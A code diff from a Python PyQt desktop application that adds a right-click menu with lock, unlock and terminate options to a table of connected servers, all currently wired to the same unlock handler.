@@ -52,6 +52,9 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_user, 150)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlockServer)
+        # Initializing explorer right click menu
+        self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
+        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.serversMenu)
 
         # Triggers
         self.startListenButton.clicked.connect(self.startListen)
@@ -237,6 +240,17 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
     def stopListen(self):
         pass
 
+    def serversMenu(self, point):
+        self.eMenu = QMenu(self)
+
+        if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
+            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'unlock.png')), 'Unlock Server', self.unlockServer)
+
+        else:
+            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'lock.png')), 'Lock Server', self.unlockServer)
+            self.eMenu.addSeparator()
+            self.eMenu.addAction(QIcon(os.path.join(self.assets, 'stop.png')), 'Terminate Server', self.unlockServer)
+        self.eMenu.exec_(self.serversTable.mapToGlobal(point))
 
     # send socket
     def Send(self, Sock, cmd, end="[ENDOFMESSAGE]"):
